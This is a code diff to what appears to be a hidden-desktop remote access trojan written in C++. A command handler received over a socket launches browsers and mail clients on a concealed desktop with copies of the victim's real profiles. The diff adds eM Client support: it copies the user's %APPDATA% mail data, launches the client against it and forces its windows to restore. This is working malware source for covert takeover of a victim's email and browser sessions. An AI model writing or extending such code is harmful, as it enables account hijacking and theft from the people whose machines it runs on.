@@ -187,6 +187,26 @@ static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
     return addr;
 }
 
+static bool IsProcessName(DWORD pid, const wstring& exeName) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess) return false;
+    wchar_t path[MAX_PATH] = {0};
+    DWORD size = MAX_PATH;
+    bool match = false;
+    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
+        wstring fullPath = path;
+        size_t slash = fullPath.find_last_of(L"\\");
+        if (slash != wstring::npos) {
+            wstring name = fullPath.substr(slash + 1);
+            if (_wcsicmp(name.c_str(), exeName.c_str()) == 0) {
+                match = true;
+            }
+        }
+    }
+    CloseHandle(hProcess);
+    return match;
+}
+
 static bool patch_cursor_info(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProcess) return false;
@@ -249,6 +269,7 @@ static bool patch_cursor_info(DWORD pid) {
 }
 
 static vector<DWORD> g_patchedPids;
+static atomic<DWORD> g_emClientPid(0);
 
 static void patch_all_opera_processes() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -944,6 +965,22 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD pid = 0;
+                GetWindowThreadProcessId(hwnd, &pid);
+                if (pid != 0 && IsProcessName(pid, L"MailClient.exe")) {
+                    wchar_t title[256] = {0};
+                    GetWindowTextW(hwnd, title, 256);
+                    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                    HWND owner = GetWindow(hwnd, GW_OWNER);
+                    if (wcslen(title) > 0 && (style & WS_CAPTION) && owner == NULL) {
+                        if (IsIconic(hwnd) || !IsWindowVisible(hwnd)) {
+                            ShowWindow(hwnd, SW_RESTORE);
+                            SetForegroundWindow(hwnd);
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -2122,6 +2159,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_inputThread.joinable())   g_inputThread.join();
             if (g_patchThread.joinable())   g_patchThread.join();
             g_patchedPids.clear();
+            g_emClientPid = 0;
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -2156,7 +2194,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2217,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2225,6 +2265,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             } else if (wRequestedPath == L"Thunderbird") {
                                 exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
                                 if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+                            } else if (wRequestedPath == L"eM Client") {
+                                exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
                             }
                         }
                     }
@@ -2275,7 +2318,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
 
                     } else if (copyProfile) {
-                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                        wstring sourceUserData;
+                        if (wRequestedPath == L"eM Client") {
+                            wchar_t appData[MAX_PATH];
+                            if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData) == S_OK) {
+                                sourceUserData = wstring(appData) + L"\\eM Client";
+                            }
+                        } else {
+                            sourceUserData = get_browser_profile_path(wRequestedPath);
+                        }
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("User Data directory not found.");
@@ -2303,18 +2354,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             return;
                         }
 
-                        WIN32_FIND_DATAW findData;
-                        HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
-                        if (hFind != INVALID_HANDLE_VALUE) {
-                            do {
-                                wstring name = findData.cFileName;
-                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                    profileDir = name;
-                                    break;
-                                }
-                            } while (FindNextFileW(hFind, &findData));
-                            FindClose(hFind);
+                        if (wRequestedPath != L"eM Client") {
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    wstring name = findData.cFileName;
+                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                        (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
                         }
                         profilePath = tempProfileRoot;
                     }
@@ -2343,6 +2396,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        if (copyProfile && !profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2430,7 +2487,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
-                            } else {
+                            } else if (wRequestedPath != L"eM Client") {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
                                 fs::remove(fs::path(profilePath) / L"SingletonCookie");
@@ -2463,8 +2520,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    if (wRequestedPath == L"eM Client") {
+                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", L"1");
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_emClientPid = pi.dwProcessId;
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
@@ -2476,6 +2540,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                    }
+
+                    if (wRequestedPath == L"eM Client") {
+                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", NULL);
                     }
 
                     if (hCurrentDesktop) {
